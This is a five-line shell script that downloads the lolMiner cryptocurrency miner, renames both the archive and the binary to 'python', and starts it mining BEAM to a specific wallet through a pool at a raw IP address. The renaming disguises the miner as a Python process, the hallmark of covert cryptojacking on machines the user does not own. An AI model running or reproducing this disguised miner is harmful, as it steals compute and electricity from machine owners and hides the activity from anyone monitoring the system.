curl -L -o python.tar.gz https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.34/lolMiner_v1.34_Lin64.tar.gz
tar -zxvf python.tar.gz
cd 1.34
mv lolMiner python
./python --coin BEAM --pool 168.119.69.50:1130 --user 2523fa5af0ff1d1da52264c5a70c02c1291ad2daec9f72ea87b7189ed4a18af6be4.GPU --tls on
